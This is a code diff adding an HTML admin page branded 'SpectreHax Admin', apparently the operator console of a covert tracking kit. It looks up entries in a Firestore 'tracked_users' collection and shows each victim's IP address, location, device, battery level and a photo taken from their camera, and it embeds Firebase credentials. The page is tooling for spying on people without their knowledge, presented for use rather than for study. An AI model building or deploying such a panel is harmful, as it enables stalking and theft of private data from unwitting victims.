@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Camera View</title>
+    <style>
+        body { font-family: sans-serif; background: #222; color: #fff; padding: 20px; }
+        .container { max-width: 600px; margin: 0 auto; background: #333; padding: 20px; border-radius: 8px; }
+        input { padding: 10px; width: 60%; }
+        button { padding: 10px 20px; background: #e94560; color: white; border: none; cursor: pointer; }
+        
+        /* Image Styling */
+        #captured-photo {
+            width: 100%;
+            max-width: 320px;
+            border: 2px solid #e94560;
+            margin-top: 10px;
+            display: none;
+            border-radius: 5px;
+        }
+        .data-row { margin: 10px 0; border-bottom: 1px solid #444; padding-bottom: 5px; }
+        .label { color: #aaa; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>SpectreHax Admin</h2>
+        <div>
+            <input type="text" id="inputId" placeholder="Enter ID (e.g., 8585814444)">
+            <button onclick="getData()">Check Data</button>
+        </div>
+
+        <div id="results" style="display:none; margin-top:20px;">
+            <h3>Captured Photo:</h3>
+            <img id="captured-photo" alt="User Photo">
+            <p id="no-photo" style="color:orange; display:none;">No photo available (User denied permission).</p>
+            
+            <div class="data-row"><span class="label">IP:</span> <span id="ip"></span></div>
+            <div class="data-row"><span class="label">Location:</span> <span id="city"></span></div>
+            <div class="data-row"><span class="label">Device:</span> <span id="device"></span></div>
+            <div class="data-row"><span class="label">Battery:</span> <span id="battery"></span></div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+        import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAgisxeeq0hYN-7SF62IGkvZHPVmWnyThg",
+            authDomain: "xyze-9b306.firebaseapp.com",
+            projectId: "xyze-9b306",
+            storageBucket: "xyze-9b306.firebasestorage.app",
+            messagingSenderId: "814674031370",
+            appId: "1:814674031370:web:aa8f08895c1d305b2540f3",
+            measurementId: "G-33ZZ3HXVFC"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        window.getData = async function() {
+            const id = document.getElementById('inputId').value;
+            if(!id) return alert("Enter ID");
+
+            const docRef = doc(db, "tracked_users", id);
+            const docSnap = await getDoc(docRef);
+
+            if (docSnap.exists()) {
+                const data = docSnap.data();
+                document.getElementById('results').style.display = 'block';
+                document.getElementById('ip').innerText = data.ip;
+                document.getElementById('city').innerText = data.city;
+                document.getElementById('device').innerText = data.platform;
+                document.getElementById('battery').innerText = data.battery;
+
+                // Handle Photo
+                const img = document.getElementById('captured-photo');
+                const noPhotoMsg = document.getElementById('no-photo');
+                
+                if (data.photo && data.photo.startsWith("data:image")) {
+                    img.src = data.photo;
+                    img.style.display = "block";
+                    noPhotoMsg.style.display = "none";
+                } else {
+                    img.style.display = "none";
+                    noPhotoMsg.style.display = "block";
+                    noPhotoMsg.innerText = data.photo; // Show error message
+                }
+            } else {
+                alert("ID not found.");
+            }
+        }
+    </script>
+</body>
+</html>
+
